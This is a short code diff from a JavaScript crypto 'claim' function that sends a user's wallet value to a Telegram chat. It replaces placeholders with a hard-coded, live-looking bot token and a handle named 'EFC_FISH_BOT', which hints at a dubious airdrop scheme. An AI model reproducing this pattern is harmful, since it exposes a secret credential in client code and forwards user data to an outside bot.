@@ -320,8 +320,8 @@ function claimRealToken() {
     return;
   }
   // Send wallet to your admin via Telegram Bot
-  let botToken = "YOUR_BOT_TOKEN";
-  let adminId = "YOUR_TELEGRAM_ID";
+  let botToken = "8651907097:AAFVyWZVGj8JApMTEpgf3rgspeYZ-2ltks8";
+  let adminId = "@EFC_FISH_BOT";
   let msg = `New Claim Request:\nWallet: ${wallet}\nAmount: 100 EFC`;
 
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent(msg)}`)
